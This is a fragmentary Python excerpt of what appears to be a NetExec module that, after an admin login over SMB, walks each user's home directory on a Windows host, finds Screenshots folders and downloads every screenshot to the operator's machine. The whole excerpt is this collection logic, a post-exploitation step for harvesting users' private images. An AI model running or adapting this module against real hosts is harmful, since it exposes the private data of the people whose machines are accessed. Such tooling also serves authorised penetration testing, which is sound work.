...
class NXCModule:
    ...
    def options(self, context, module_options):
        ...
        self.users = (
            [user.lower() for user in module_options["USERS"].split(",")]
    ...
    def on_admin_login(self, context, connection):
        ...
        context.log.info(
            f"User folders: {[folder.get_longname() for folder in user_folders]}"
        )
        if not user_folders:
        ...
        for user_folder in user_folders:
            ...
            if folder_name.lower() not in [
                ...
                context.log.info(
                    f"Searching for Screenshots folder in {folder_name}'s home directory"
                )
                screenshots_folders = self.find_screenshots_folders(folder_name)
                if not screenshots_folders:
                    context.log.debug(
                        f"No Screenshots folder found for user {folder_name}. Skipping."
                    )
                    continue

                for screenshot_path in screenshots_folders:
                    try:
                        screenshot_files = connection.conn.listPath(
                            self.share, screenshot_path + "\\*"
                        )
                    except Exception as e:
                        context.log.debug(
                            f"Screenshot folder {screenshot_path} not found for user {folder_name}: {e}"
                        )
                        continue

                    if not screenshot_files:
                        context.log.debug(
                            f"No screenshots found in {screenshot_path} for user {folder_name}"
                        )
                        continue
                    ...
                    for file in screenshot_files:
                        if not file.is_directory():
                            ...
                            remote_file_path = ntpath.join(
                                screenshot_path, remote_file_name
                            )
                            sanitized_path = screenshot_path.replace("\\", "_").replace(
                                "/", "_"
                            )
                            local_file_name = (
                                f"{folder_name}_{sanitized_path}_{remote_file_name}"
                            )
                            ...
                            try:
                                with open(local_file_path, "wb") as local_file:
                                    context.log.debug(
                                        f"Downloading {remote_file_path} to {local_file_path}"
                                    )
                                    connection.conn.getFile(
                                        self.share, remote_file_path, local_file.write
                                    )

                                if not exists(local_file_path):
                                    context.log.fail(
                                        f"Downloaded file '{local_file_path}' does not exist."
                                    )
                                    continue
                                ...
                                if file_size == 0:
                                    context.log.fail(
                                        f"Downloaded file '{local_file_path}' is 0 bytes. Skipping."
                                    )
                                ...
                                context.log.debug(
                                    f"Failed to download '{remote_file_path}' for user {folder_name}: {e}"
                                )

        if total_files_downloaded > 0 and host_output_path:
            context.log.success(
                f"{total_files_downloaded} file(s) downloaded from host {connection.host} to {host_output_path}."
            )
        ...
        try:
            ...
            for subfolder in subfolders:
                if subfolder.is_directory() and subfolder.get_longname() not in [
                    ...
                    potential_path = ntpath.join(
                        base_path, subfolder.get_longname(), "Screenshots"
                    )
                    try:
                        if self.connection.conn.listPath(
                            self.share, potential_path + "\\*"
                        ):
